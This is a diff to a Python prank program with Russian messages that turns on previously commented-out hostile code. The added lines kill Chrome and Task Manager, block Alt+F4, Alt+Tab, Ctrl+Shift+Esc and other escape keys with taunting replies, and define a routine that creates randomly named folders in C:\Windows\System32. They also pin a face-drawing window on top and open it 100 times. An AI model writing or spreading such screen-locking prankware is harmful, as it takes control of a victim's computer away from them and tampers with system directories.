@@ -1,39 +1,41 @@
+from ctypes import windll
 import os
 import keyboard
 import random
 import pygame
 from pygame.draw import *
-import time
 pygame.init()
-#
-# os.system("taskkill chrome")
-# os.system("taskkill taskmgr")
-# keyboard.add_hotkey("alt + f4", lambda: print('это не выход!'), suppress=True)
-# keyboard.add_hotkey("alt + tab", lambda: print('не уйдёшь!'), suppress=True)
-# keyboard.add_hotkey("Ctrl + Shift + Esc", lambda: print('не-а )))'), suppress=True)
-# keyboard.add_hotkey("Alt +Esc", lambda: print('не так просто'), suppress=True)
-# keyboard.add_hotkey("Ctrl +Esc", lambda: print('не так просто'), suppress=True)
-# keyboard.add_hotkey("f1", lambda: print('Я твоя помошь'), suppress=True)
-#
-#
-# def random_id(length):
-#     number = '0123456789'
-#     alpha = 'abcdefghijklmnopqrstuvwxyz'
-#     idshnik = 'joke_'
-#     for i in range(0, length, 2):
-#         idshnik += random.choice(number)
-#         idshnik += random.choice(alpha)
-#     return idshnik
-#
-#
-# def fold(col):
-#     for i in range(col):
-#         na = random_id(50)
-#         os.mkdir("C:\Windows\System32\\"+na)
-#
-#
-#
-for i in range(3):
+SetWindowPos = windll.user32.SetWindowPos
+
+
+os.system("taskkill chrome")
+os.system("taskkill taskmgr")
+keyboard.add_hotkey("alt + f4", lambda: print('это не выход!'), suppress=True)
+keyboard.add_hotkey("alt + tab", lambda: print('не уйдёшь!'), suppress=True)
+keyboard.add_hotkey("Ctrl + Shift + Esc", lambda: print('не-а )))'), suppress=True)
+keyboard.add_hotkey("Alt +Esc", lambda: print('не так просто'), suppress=True)
+keyboard.add_hotkey("Ctrl +Esc", lambda: print('не так просто'), suppress=True)
+keyboard.add_hotkey("f1", lambda: print('Я твоя помошь'), suppress=True)
+
+
+def random_id(length):
+    number = '0123456789'
+    alpha = 'abcdefghijklmnopqrstuvwxyz'
+    idshnik = 'joke_'
+    for i in range(0, length, 2):
+        idshnik += random.choice(number)
+        idshnik += random.choice(alpha)
+    return idshnik
+
+
+def fold(col):
+    for i in range(col):
+        na = random_id(50)
+        os.mkdir("C:\Windows\System32\\"+na)
+
+
+
+for i in range(100):
     import pygame
     from pygame.draw import *
     pygame.init()
@@ -47,6 +49,7 @@ for i in range(3):
     color = (255, 255, 255)
     rect(screen, SCREEN_COLOR, [0, 0, SCREEN1, SCREEN2])
     class my_face:
+        SetWindowPos(pygame.display.get_wm_info()['window'], -1, 500, 500, 0, 0, 0x0001)
         class skin:
             circle(screen, color="yellow", radius=150, center=[200, 200])
         class eyes:
@@ -69,4 +72,3 @@ for i in range(3):
             if event.type == pygame.QUIT:
                 finished = True
     pygame.quit()
-    time.sleep(20)
